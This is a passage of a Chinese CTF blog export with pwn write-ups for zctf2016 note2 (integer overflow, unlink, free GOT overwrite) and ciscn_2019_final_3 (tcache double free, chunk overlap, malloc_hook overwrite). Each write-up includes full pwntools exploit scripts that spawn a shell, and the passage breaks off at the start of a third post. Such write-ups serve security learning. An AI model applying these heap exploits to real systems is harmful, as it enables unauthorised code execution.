        <span class="built_in">strcpy</span>(src, dest);</span><br><span class="line">          <span class="built_in">free</span>(v7);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Edit note success!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Error choice!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;note has been deleted&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please add a note!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><ul><li>对free的指针进行了清零的操作，uaf和double free无法使用了</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">  <span class="built_in">LODWORD</span>(v0) = <span class="built_in">input</span>();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = *(&amp;heaplist + v0);</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(*(&amp;heaplist + v2));</span><br><span class="line">      *(&amp;heaplist + v2) = <span class="number">0LL</span>;</span><br><span class="line">      chunk_size[v2] = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">LODWORD</span>(v0) = <span class="built_in">puts</span>(<span class="string">&quot;delete note success!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="核心漏洞点-整数溢出"><a href="#核心漏洞点-整数溢出" class="headerlink" title="核心漏洞点-整数溢出"></a>核心漏洞点-整数溢出</h2><ul><li>在add函数的input1函数中，存在难发现的整数溢出漏洞</li></ul><p><img src="/2024/09/25/zctf2016-note2-unlink/capture_20240925195730160.bmp"></p><ul><li><font size="red">定义的i是一个无符号整型，但是a2(size)确是一个有符号整形，因此有整数溢出</font></li><li>对于无符号与有符号的比较，会将<strong>有符号转化为无符号</strong>，所以若我们给a2赋值为0，a2 -1&#x3D;-1,对应于无符号整型是最大的数字，那么我们就可以任意写了。</li></ul><h1 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h1><h2 id="构造unlink"><a href="#构造unlink" class="headerlink" title="构造unlink"></a>构造unlink</h2><ul><li>题目没有开启PIE，自然想到了unlink，由于edit中会malloc(0xa0)的chunk，我们构造出一个0xa0的free_chunk，在edit的时候就相当于是覆写了，借助这个0xa0的chunk还可以进行unlink:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">heaplist = <span class="number">0x00602120</span></span><br><span class="line">fd = heaplist - <span class="number">0x18</span></span><br><span class="line">bk = heaplist - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于不能edit直接改，所以</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + p64(fd) + p64(bk)</span><br><span class="line">add(<span class="number">0x80</span>,payload) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;cccc&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x00</span>,payload)</span><br><span class="line">bug()</span><br></pre></td></tr></table></figure><ul><li>0xa0 &#x3D; 0x80 + 0x20（0x80是因为我们构造unlink的fake_chunk是从user_data开始构造，此处相当于overlapping chunk0,chunk1）</li><li>正常应该是溢出修改chunk2的prev_size为0xa0,以及size的inuse&#x3D;0，但是我们没有off_by_one，也无法直接溢出改，于是，我们利用add里面的整数溢出进行改写</li><li>free(chunk1)，只要将size赋值为0，就可以溢出改写了，效果如下：</li></ul><p><img src="/2024/09/25/zctf2016-note2-unlink/capture_20240925201946698.bmp"></p><h2 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h2><ul><li>接下来直接free相邻chunk，即chunk2，就可以达到unlink的效果</li></ul><p><img src="/2024/09/25/zctf2016-note2-unlink/capture_20240925202348973.bmp"></p><ul><li>此时就是正常的unlink的利用，如下：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;is &quot;</span>)</span><br><span class="line">free_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">success(<span class="string">&quot;free_address : &quot;</span>+<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc6_2.23-0ubuntu10_amd64.so&quot;</span>)</span><br><span class="line">base = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">onegadget = base + <span class="number">0xf02a4</span> <span class="comment"># 0xf02a4 0xf1147 0x4526a</span></span><br></pre></td></tr></table></figure><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ul><li>在分析edit函数的时候就说了，会在最后执行一次free，所以直接edit chunk0为Onegadget相当于修改free_got 为onegadget,并且在最后会执行free，即onegadget,getshell</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 改free_got 为 onegadget</span></span><br><span class="line">edit(<span class="number">0</span>,p64(onegadget)) <span class="comment"># edit改完会执行free</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,27639)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;option---&gt;&gt;&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the length of the note content:(less than 128)&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the note content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the id of the note:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the id of the note:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;2.append]&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;TheNewContents:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the id of the note:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以打unlink</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh&quot;</span>) <span class="comment">#name</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;ddd&quot;</span>)</span><br><span class="line"></span><br><span class="line">heaplist = <span class="number">0x00602120</span></span><br><span class="line">fd = heaplist - <span class="number">0x18</span></span><br><span class="line">bk = heaplist - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于不能edit直接改，所以</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + p64(fd) + p64(bk)</span><br><span class="line">add(<span class="number">0x80</span>,payload) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;cccc&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x00</span>,payload)</span><br><span class="line">bug()</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;is &quot;</span>)</span><br><span class="line">free_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">success(<span class="string">&quot;free_address : &quot;</span>+<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc6_2.23-0ubuntu10_amd64.so&quot;</span>)</span><br><span class="line">base = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">onegadget = base + <span class="number">0xf02a4</span> <span class="comment"># 0xf02a4 0xf1147 0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 改free_got 为 onegadget</span></span><br><span class="line">edit(<span class="number">0</span>,p64(onegadget)) <span class="comment"># edit改完会执行free</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tcache_double_free_overlap</title>
      <link href="/2024/09/23/tcache-double-free-overlap/"/>
      <url>/2024/09/23/tcache-double-free-overlap/</url>
      
        <content type="html"><![CDATA[<h2 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a>ciscn_2019_final_3</h2><p><a href="https://buuoj.cn/challenges#ciscn_2019_final_3">题目链接</a></p><p><strong>overlap</strong>：<a href="https://blog.csdn.net/qq_41202237/article/details/108320408">参考文章</a></p><p><strong>题解参考文章：</strong><a href="https://blog.csdn.net/mcmuyanga/article/details/113995633">参考题解</a></p><h1 id="ida速览"><a href="#ida速览" class="headerlink" title="ida速览"></a>ida速览</h1><ul><li>main函数只有add和free可以使用</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setinit();</span><br><span class="line">  v3 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;welcome to babyheap&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;choice &gt; &quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::istream::operator&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      remove();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><ul><li><strong>核心就位于画红框的地方，相当于show了。</strong></li></ul><p><img src="/2024/09/23/tcache-double-free-overlap/capture_20240923192321767.bmp"></p><h2 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h2><p><img src="/2024/09/23/tcache-double-free-overlap/capture_20240923192541167.bmp"></p><h1 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h1><ul><li>泄露libc是必不可少的，该题目有tcache，要free掉0x410以上的chunk才可以进入到unsorted bin 中，但是此题目规定了只能size只能&lt;&#x3D;0x78，于是我们想到了overlapping修改size</li><li>关于overlapping可以看开头的文章，修改完size，free即可获得main_arena+96地址，得到libc，获得onegadget</li><li>double free 改malloc hook为onegadget,再次malloc即可，相当于调用onegadget</li></ul><h1 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h1><h2 id="overlapping-泄露libc"><a href="#overlapping-泄露libc" class="headerlink" title="overlapping+泄露libc"></a>overlapping+泄露libc</h2><ul><li><strong>想要overlapping,得先构造出0x421的chunk出来，一开始没有构造，后面再次malloc的chunk其实是在这个free_chunk里面的，再次free会报错。</strong></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0x400 = 8*0x80</span></span><br><span class="line">heap = add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x78</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line"><span class="comment"># 以上是构造出0x421的chunk</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free修改size</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># 此时 tcache 5 &gt; 5</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x28</span>,p64(heap-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x28</span>,p64(heap-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x28</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)) <span class="comment"># 修改size为0x421</span></span><br></pre></td></tr></table></figure><ul><li>这里也不是很懂，不知道为什么中间会插一步tcache，以后再填上</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">0</span>) <span class="comment"># unsorted bin 此时chunk0_addr -&gt; main_arena+96</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># tcache</span></span><br><span class="line">test = add(<span class="number">13</span>,<span class="number">0x78</span>,<span class="string">b&#x27;f&#x27;</span>) <span class="comment"># 切割unsorted bin</span></span><br><span class="line">success(<span class="string">&quot;test : &quot;</span>+<span class="built_in">hex</span>(test))</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x18</span>,<span class="string">b&#x27;f&#x27;</span>) <span class="comment"># tcache</span></span><br><span class="line">main_arena = add(<span class="number">15</span>,<span class="number">0x18</span>,<span class="string">b&#x27;f&#x27;</span>) - <span class="number">96</span></span><br><span class="line">success(<span class="string">&quot;main_arena : &quot;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">malloc_hook = base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">onegadget += base</span><br></pre></td></tr></table></figure><h2 id="double-free-修改malloc-hook"><a href="#double-free-修改malloc-hook" class="headerlink" title="double free 修改malloc_hook"></a>double free 修改malloc_hook</h2><ul><li>修改malloc_hook为onegadget，然后再次malloc就可以getshell</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">16</span>,<span class="number">0x78</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">17</span>,<span class="number">0x78</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">18</span>,<span class="number">0x78</span>,p64(onegadget))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;19&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># 调用onegadget</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25726</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input the index&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input the size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;now you can write something&quot;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;gift :&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline()[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input the index&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 具有tcache,用overlap，可以修改size&gt;0x408再次free既可进入</span></span><br><span class="line"><span class="comment"># unsorted bin 然后输出泄漏libc</span></span><br><span class="line"><span class="comment"># 查询wp，发现用double free</span></span><br><span class="line">onegadget = <span class="number">0x10a38c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x400 = 8*0x80</span></span><br><span class="line">heap = add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x78</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># 此时 tcache 5 &gt; 5</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x28</span>,p64(heap-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x28</span>,p64(heap-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x28</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)) <span class="comment"># 修改size为0x421</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># unsorted bin 此时chunk0_addr -&gt; main_arena+96</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># tcache</span></span><br><span class="line">test = add(<span class="number">13</span>,<span class="number">0x78</span>,<span class="string">b&#x27;f&#x27;</span>) <span class="comment"># 切割unsorted bin</span></span><br><span class="line">success(<span class="string">&quot;test : &quot;</span>+<span class="built_in">hex</span>(test))</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x18</span>,<span class="string">b&#x27;f&#x27;</span>) <span class="comment"># tcache</span></span><br><span class="line">main_arena = add(<span class="number">15</span>,<span class="number">0x18</span>,<span class="string">b&#x27;f&#x27;</span>) - <span class="number">96</span></span><br><span class="line">success(<span class="string">&quot;main_arena : &quot;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">malloc_hook = base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">onegadget += base</span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">16</span>,<span class="number">0x78</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">17</span>,<span class="number">0x78</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">18</span>,<span class="number">0x78</span>,p64(onegadget))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;19&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># 调用onegadget</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初遇tcache-double_free</title>
      <link href="/2024/09/22/%E5%88%9D%E9%81%87tcache-double-free/"/>
      <url>/2024/09/22/%E5%88%9D%E9%81%87tcache-double-free/</url>
      
        <content type="html"><![CDATA[<h1 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a>ciscn_2019_es_1</h1><p><a href="https://buuoj.cn/challenges#ciscn_2019_es_1">题目链接</a></p><p><font size="4" color="red">要点：</font></p><ul><li>虽然说tcache的double free漏洞在glibc2.30之后才完备，但是glibc2.27中也有版本具备该检测</li><li>我最开始用的2.27-3ubuntu1.5_amd64就是不可以的，但是此题目是没有该检查的，本地测试可以用2.27-3ubuntu1_amd64</li></ul><h1 id="ida速览"><a href="#ida速览" class="headerlink" title="ida速览"></a>ida速览</h1><ul><li><strong>经典的堆菜单，但是glibc2.27具有tcache</strong></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I hate 2.29 , can you understand me?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;maybe you know the new libc&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu(); <span class="comment">// 菜单</span></span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span 